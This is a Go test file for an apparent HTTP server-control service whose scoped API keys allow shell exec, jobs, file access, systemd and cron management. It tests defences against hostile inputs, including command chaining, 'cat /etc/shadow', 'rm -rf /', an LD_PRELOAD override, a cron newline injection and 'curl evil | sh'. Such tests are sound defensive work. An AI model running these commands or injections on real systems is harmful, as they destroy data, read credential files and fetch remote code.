package server

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/adee42/mcp-server-control/internal/api"
)

const (
	adminKey   = "sck_admin0000000000000000000000000000000000000"
	limitedKey = "sck_limited00000000000000000000000000000000000"
)

func testConfig(t *testing.T, extra string) *Config {
	t.Helper()
	yml := fmt.Sprintf(`
limits: { max_output: 64KiB }
cron_dir: %q
keys:
  - name: admin
    hash: %s
    scopes: [info, exec, jobs, files, services, services:manage, cron]
    commands: { deny: ["^rm -rf /"] }
    paths: { read: [%q], write: [%q] }
    services: { allow: ["*"] }
  - name: limited
    hash: %s
    scopes: [info, exec, services, cron]
    commands: { allow: ["^echo ", "^systemctl status "] }
    services: { allow: ["nginx", "app-*"] }
%s`, t.TempDir(), HashKey(adminKey), t.TempDir(), t.TempDir(), HashKey(limitedKey), extra)
	cfg, err := ParseConfig([]byte(yml))
	if err != nil {
		t.Fatal(err)
	}
	return cfg
}

type fakeServices struct{ calls [][]string }

func (f *fakeServices) run(ctx context.Context, name string, args ...string) ([]byte, error) {
	f.calls = append(f.calls, append([]string{name}, args...))
	switch {
	case len(args) > 0 && args[0] == "list-units":
		return []byte("nginx.service loaded active running A high performance web server\n" +
			"app-api.service loaded failed failed API\n" +
			"ssh.service loaded active running OpenBSD Secure Shell server\n"), nil
	case len(args) > 0 && args[0] == "show":
		return []byte("Id=nginx.service\nActiveState=active\nSubState=running\n"), nil
	case len(args) > 0 && args[0] == "is-active":
		return []byte("active\n"), nil
	}
	return nil, nil
}

func newTestServer(t *testing.T, cfg *Config) (*Server, *fakeServices) {
	fs := &fakeServices{}
	s := New(cfg, nil, &Systemd{Run: fs.run})
	t.Cleanup(s.Close)
	return s, fs
}

func do(t *testing.T, s *Server, key, method, path string, body any) (int, []byte) {
	t.Helper()
	var r *http.Request
	if body != nil {
		b, _ := json.Marshal(body)
		r = httptest.NewRequest(method, path, strings.NewReader(string(b)))
	} else {
		r = httptest.NewRequest(method, path, nil)
	}
	if key != "" {
		r.Header.Set("Authorization", "Bearer "+key)
	}
	w := httptest.NewRecorder()
	s.Handler().ServeHTTP(w, r)
	return w.Code, w.Body.Bytes()
}

func TestPlanCommand(t *testing.T) {
	cfg := testConfig(t, "")
	admin, limited := cfg.Keys[0], cfg.Keys[1]
	cases := []struct {
		k      *Key
		cmd    string
		ok     bool
		shell  bool
		reason string
	}{
		{admin, "ls -la; whoami", true, true, ""},
		{admin, "rm -rf / --no-preserve-root", false, false, "deny"},
		{limited, "echo hello", true, false, ""},
		{limited, "echo   'hello world'", true, false, ""},
		{limited, "echo hi; rm -rf /tmp/x", false, false, "metacharacter"},
		{limited, "echo hi && id", false, false, "metacharacter"},
		{limited, "echo $(id)", false, false, "metacharacter"},
		{limited, "echo `id`", false, false, "metacharacter"},
		{limited, "echo hi\nid", false, false, "metacharacter"},
		{limited, "systemctl status nginx", true, false, ""},
		{limited, "systemctl restart nginx", false, false, "allowlist"},
		{limited, "cat /etc/shadow", false, false, "allowlist"},
		{limited, "", false, false, "empty"},
	}
	for _, c := range cases {
		plan, err := c.k.planCommand(c.cmd)
		if c.ok != (err == nil) {
			t.Errorf("%s %q: err=%v, want ok=%v", c.k.Name, c.cmd, err, c.ok)
			continue
		}
		if err != nil && !strings.Contains(err.Error(), c.reason) {
			t.Errorf("%s %q: error %q does not mention %q", c.k.Name, c.cmd, err, c.reason)
		}
		if err == nil && plan.shell != c.shell {
			t.Errorf("%s %q: shell=%v, want %v", c.k.Name, c.cmd, plan.shell, c.shell)
		}
	}
	plan, _ := limited.planCommand("echo   'hello world'")
	if got := strings.Join(plan.argv, "|"); got != "echo|hello world" {
		t.Errorf("argv = %q", got)
	}
	if err := limited.checkEnv(map[string]string{"LD_PRELOAD": "/x.so"}); err == nil {
		t.Error("allowlisted key accepted env override")
	}
}

func TestAuth(t *testing.T) {
	past := time.Now().Add(-time.Hour).UTC().Format(time.RFC3339)
	extra := fmt.Sprintf(`  - name: expired
    hash: %s
    scopes: [info]
    expires: %s
  - name: office
    hash: %s
    scopes: [info]
    ip_allow: ["10.1.0.0/16"]
  - name: slow
    hash: %s
    scopes: [info]
    rate_limit: { per_minute: 60, burst: 2 }
`, HashKey("sck_expired"), past, HashKey("sck_office"), HashKey("sck_slow"))
	s, _ := newTestServer(t, testConfig(t, extra))

	if code, _ := do(t, s, "", "GET", "/v1/info", nil); code != 401 {
		t.Errorf("no key: %d", code)
	}
	if code, _ := do(t, s, "sck_wrong", "GET", "/v1/info", nil); code != 401 {
		t.Errorf("wrong key: %d", code)
	}
	if code, body := do(t, s, "sck_expired", "GET", "/v1/info", nil); code != 401 || !strings.Contains(string(body), "expired") {
		t.Errorf("expired key: %d %s", code, body)
	}
	// httptest requests come from 192.0.2.1.
	if code, _ := do(t, s, "sck_office", "GET", "/v1/info", nil); code != 403 {
		t.Errorf("wrong IP: %d", code)
	}
	for i, want := range []int{200, 200, 429} {
		if code, _ := do(t, s, "sck_slow", "GET", "/v1/info", nil); code != want {
			t.Errorf("rate limit request %d: %d, want %d", i, code, want)
		}
	}
	if code, body := do(t, s, limitedKey, "POST", "/v1/jobs", api.JobRequest{Command: "echo hi"}); code != 403 || !strings.Contains(string(body), "scope") {
		t.Errorf("missing scope: %d %s", code, body)
	}
	if code, _ := do(t, s, "", "GET", "/v1/health", nil); code != 200 {
		t.Errorf("health: %d", code)
	}
	var info api.Info
	code, body := do(t, s, adminKey, "GET", "/v1/info", nil)
	if err := json.Unmarshal(body, &info); code != 200 || err != nil || info.KeyName != "admin" {
		t.Errorf("info: %d %s", code, body)
	}
}

func TestExec(t *testing.T) {
	s, _ := newTestServer(t, testConfig(t, ""))
	var res api.ExecResult
	code, body := do(t, s, adminKey, "POST", "/v1/exec", api.ExecRequest{Command: "echo hello"})
	if err := json.Unmarshal(body, &res); code != 200 || err != nil {
		t.Fatalf("exec: %d %s", code, body)
	}
	if strings.TrimSpace(res.Stdout) != "hello" || res.ExitCode != 0 {
		t.Errorf("exec result: %+v", res)
	}
	code, body = do(t, s, adminKey, "POST", "/v1/exec", api.ExecRequest{Command: "exit 3"})
	json.Unmarshal(body, &res)
	if code != 200 || res.ExitCode != 3 {
		t.Errorf("exit code: %d %s", code, body)
	}
	if code, body := do(t, s, limitedKey, "POST", "/v1/exec", api.ExecRequest{Command: "echo hi; id"}); code != 403 {
		t.Errorf("limited chaining: %d %s", code, body)
	}
}

func TestExecTimeoutAndTruncation(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("uses POSIX shell commands")
	}
	s, _ := newTestServer(t, testConfig(t, ""))
	var res api.ExecResult
	_, body := do(t, s, adminKey, "POST", "/v1/exec", api.ExecRequest{Command: "sleep 30", TimeoutSeconds: 1})
	json.Unmarshal(body, &res)
	if !res.TimedOut {
		t.Errorf("expected timeout: %s", body)
	}
	_, body = do(t, s, adminKey, "POST", "/v1/exec", api.ExecRequest{Command: "head -c 200000 /dev/zero"})
	json.Unmarshal(body, &res)
	if !res.Truncated || len(res.Stdout) != 64<<10 {
		t.Errorf("expected truncation at 64KiB, got %d bytes truncated=%v", len(res.Stdout), res.Truncated)
	}
}

func TestJobs(t *testing.T) {
	s, _ := newTestServer(t, testConfig(t, ""))
	var j api.Job
	code, body := do(t, s, adminKey, "POST", "/v1/jobs", api.JobRequest{Command: "echo started"})
	if err := json.Unmarshal(body, &j); code != 200 || err != nil || j.ID == "" {
		t.Fatalf("start: %d %s", code, body)
	}
	var out api.JobOutput
	_, body = do(t, s, adminKey, "GET", "/v1/jobs/"+j.ID+"?wait=10", nil)
	json.Unmarshal(body, &out)
	if out.Status != api.JobExited || !strings.Contains(out.Output, "started") || out.ExitCode == nil || *out.ExitCode != 0 {
		t.Errorf("job output: %s", body)
	}
	_, body = do(t, s, adminKey, "GET", fmt.Sprintf("/v1/jobs/%s?offset=%d", j.ID, out.NextOffset), nil)
	json.Unmarshal(body, &out)
	if out.Output != "" {
		t.Errorf("expected no new output, got %q", out.Output)
	}

	long := "sleep 60"
	if runtime.GOOS == "windows" {
		long = "ping -n 60 127.0.0.1"
	}
	_, body = do(t, s, adminKey, "POST", "/v1/jobs", api.JobRequest{Command: long})
	json.Unmarshal(body, &j)
	code, body = do(t, s, adminKey, "DELETE", "/v1/jobs/"+j.ID, nil)
	json.Unmarshal(body, &j)
	if code != 200 || j.Status != api.JobKilled {
		t.Errorf("kill: %d %s", code, body)
	}
	if code, _ := do(t, s, adminKey, "GET", "/v1/jobs/nope", nil); code != 404 {
		t.Errorf("unknown job: %d", code)
	}
}

func TestRingBuffer(t *testing.T) {
	b := newRingBuffer(10)
	b.Write([]byte("0123456789"))
	b.Write([]byte("abcde"))
	out, start, next := b.ReadFrom(0)
	if string(out) != "56789abcde" || start != 5 || next != 15 {
		t.Errorf("got %q %d %d", out, start, next)
	}
	out, start, _ = b.ReadFrom(12)
	if string(out) != "cde" || start != 12 {
		t.Errorf("got %q %d", out, start)
	}
	b.Write([]byte("this is longer than ten"))
	out, _, next = b.ReadFrom(0)
	if string(out) != "r than ten" || next != 38 {
		t.Errorf("got %q %d", out, next)
	}
}

func TestFiles(t *testing.T) {
	cfg := testConfig(t, "")
	admin := cfg.Keys[0]
	readRoot, writeRoot := admin.Paths.Read[0], admin.Paths.Write[0]
	os.WriteFile(filepath.Join(readRoot, "a.txt"), []byte("hello"), 0o644)
	s, _ := newTestServer(t, cfg)

	q := func(p string) string { return "?path=" + strings.ReplaceAll(p, `\`, "/") }
	var fc api.FileContent
	code, body := do(t, s, adminKey, "GET", "/v1/files"+q(filepath.Join(readRoot, "a.txt")), nil)
	if err := json.Unmarshal(body, &fc); code != 200 || err != nil || fc.ContentB64 != "aGVsbG8=" {
		t.Errorf("read: %d %s", code, body)
	}
	// Writes into the read-only root are refused; writes into the write root succeed.
	w := api.FileWrite{ContentB64: "aGk=", MkdirAll: true}
	if code, _ := do(t, s, adminKey, "PUT", "/v1/files"+q(filepath.Join(readRoot, "b.txt")), w); code != 403 {
		t.Errorf("write to read root: %d", code)
	}
	if code, body := do(t, s, adminKey, "PUT", "/v1/files"+q(filepath.Join(writeRoot, "sub", "b.txt")), w); code != 200 {
		t.Errorf("write: %d %s", code, body)
	}
	if b, _ := os.ReadFile(filepath.Join(writeRoot, "sub", "b.txt")); string(b) != "hi" {
		t.Errorf("written content %q", b)
	}
	// ".." escapes are cleaned and then rejected.
	escape := readRoot + "/../" + filepath.Base(writeRoot) + "/../../etc"
	if code, _ := do(t, s, adminKey, "GET", "/v1/files/list"+q(escape), nil); code != 403 && code != 404 {
		t.Errorf("dotdot escape: %d", code)
	}
	// Symlinks pointing outside the allowed roots are rejected.
	outside := t.TempDir()
	os.WriteFile(filepath.Join(outside, "secret"), []byte("x"), 0o644)
	link := filepath.Join(readRoot, "link")
	if err := os.Symlink(outside, link); err == nil {
		if code, _ := do(t, s, adminKey, "GET", "/v1/files"+q(filepath.Join(link, "secret")), nil); code != 403 {
			t.Errorf("symlink escape: %d", code)
		}
	}
	var dl api.DirListing
	code, body = do(t, s, adminKey, "GET", "/v1/files/list"+q(readRoot), nil)
	if err := json.Unmarshal(body, &dl); code != 200 || err != nil || len(dl.Entries) == 0 {
		t.Errorf("list: %d %s", code, body)
	}
	if code, _ := do(t, s, limitedKey, "GET", "/v1/files"+q(filepath.Join(readRoot, "a.txt")), nil); code != 403 {
		t.Errorf("limited key without files scope: %d", code)
	}
}

func TestServices(t *testing.T) {
	s, fs := newTestServer(t, testConfig(t, ""))
	var list []api.Service
	_, body := do(t, s, limitedKey, "GET", "/v1/services", nil)
	json.Unmarshal(body, &list)
	if len(list) != 2 || list[0].Unit != "nginx.service" || list[1].Active != "failed" {
		t.Errorf("filtered list: %s", body)
	}
	if code, _ := do(t, s, limitedKey, "GET", "/v1/services/ssh", nil); code != 403 {
		t.Errorf("status of disallowed unit: %d", code)
	}
	if code, body := do(t, s, limitedKey, "GET", "/v1/services/nginx?journal_lines=0", nil); code != 200 || !strings.Contains(string(body), "running") {
		t.Errorf("status: %d %s", code, body)
	}
	if code, _ := do(t, s, limitedKey, "POST", "/v1/services/nginx/restart", nil); code != 403 {
		t.Errorf("limited key restart: %d", code)
	}
	fs.calls = nil
	code, body := do(t, s, adminKey, "POST", "/v1/services/nginx/restart", nil)
	if code != 200 || !strings.Contains(string(body), `"active":"active"`) {
		t.Errorf("restart: %d %s", code, body)
	}
	if len(fs.calls) == 0 || strings.Join(fs.calls[0], " ") != "systemctl restart -- nginx.service" {
		t.Errorf("calls: %v", fs.calls)
	}
	if code, _ := do(t, s, adminKey, "POST", "/v1/services/nginx/mask", nil); code != 400 {
		t.Errorf("unknown action: %d", code)
	}
	if code, _ := do(t, s, adminKey, "POST", "/v1/services/--force/stop", nil); code != 400 {
		t.Errorf("option-like unit: %d", code)
	}
}

func TestCron(t *testing.T) {
	cfg := testConfig(t, "")
	s, _ := newTestServer(t, cfg)
	job := api.CronJob{Schedule: "*/5 * * * *", Command: "date +%s >> /var/log/x", Comment: "every five"}
	if code, body := do(t, s, adminKey, "PUT", "/v1/cron/backup-db", job); code != 200 {
		t.Fatalf("put: %d %s", code, body)
	}
	data, err := os.ReadFile(filepath.Join(cfg.CronDir, "server-control-backup-db"))
	if err != nil || !strings.Contains(string(data), `*/5 * * * * root date +\%s >> /var/log/x`) {
		t.Errorf("cron file:\n%s", data)
	}
	os.WriteFile(filepath.Join(cfg.CronDir, "someone-elses"), []byte("* * * * * root true\n"), 0o644)
	var list []api.CronJob
	_, body := do(t, s, adminKey, "GET", "/v1/cron", nil)
	json.Unmarshal(body, &list)
	if len(list) != 1 || list[0].Command != job.Command || list[0].User != "root" || list[0].Comment != "every five" {
		t.Errorf("list: %s", body)
	}
	for _, bad := range []struct{ name, sched, cmd string }{
		{"Bad_Name", "* * * * *", "true"},
		{"ok", "* * * *", "true"},
		{"ok", "@sometimes", "true"},
		{"ok", "* * * * *", "true\n* * * * * root evil"},
	} {
		if code, _ := do(t, s, adminKey, "PUT", "/v1/cron/"+bad.name, api.CronJob{Schedule: bad.sched, Command: bad.cmd}); code != 400 {
			t.Errorf("bad cron %+v accepted: %d", bad, code)
		}
	}
	if code, _ := do(t, s, limitedKey, "PUT", "/v1/cron/sneaky", api.CronJob{Schedule: "@daily", Command: "curl evil | sh"}); code != 403 {
		t.Errorf("limited key cron outside allowlist: %d", code)
	}
	if code, _ := do(t, s, adminKey, "DELETE", "/v1/cron/backup-db", nil); code != 200 {
		t.Errorf("delete: %d", code)
	}
	if code, _ := do(t, s, adminKey, "DELETE", "/v1/cron/backup-db", nil); code != 404 {
		t.Errorf("delete again: %d", code)
	}
}

func TestConfigValidation(t *testing.T) {
	bad := []string{
		"keys: [{name: a, hash: nope, scopes: [info]}]",
		"keys: [{name: a, hash: " + HashKey("x") + ", scopes: [root]}]",
		"keys: [{name: a, hash: " + HashKey("x") + ", commands: {allow: ['(']}}]",
		"keys: [{name: a, hash: " + HashKey("x") + ", ip_allow: [not-an-ip]}]",
		"keys: [{name: a, hash: " + HashKey("x") + "}, {name: a, hash: " + HashKey("y") + "}]",
		"unknown_field: 1",
	}
	for _, y := range bad {
		if _, err := ParseConfig([]byte(y)); err == nil {
			t.Errorf("accepted bad config: %s", y)
		}
	}
	cfg, err := ParseConfig([]byte("limits: {max_file: 10MiB, default_timeout: 2m}"))
	if err != nil || cfg.Limits.MaxFile != 10<<20 || time.Duration(cfg.Limits.DefaultTimeout) != 2*time.Minute {
		t.Errorf("limits: %+v %v", cfg.Limits, err)
	}
}

func TestGenerateKey(t *testing.T) {
	a, _ := GenerateKey()
	b, _ := GenerateKey()
	if a == b || !strings.HasPrefix(a, "sck_") || len(a) != 47 || ValidateRawKey(a) != nil {
		t.Errorf("keys %q %q", a, b)
	}
}
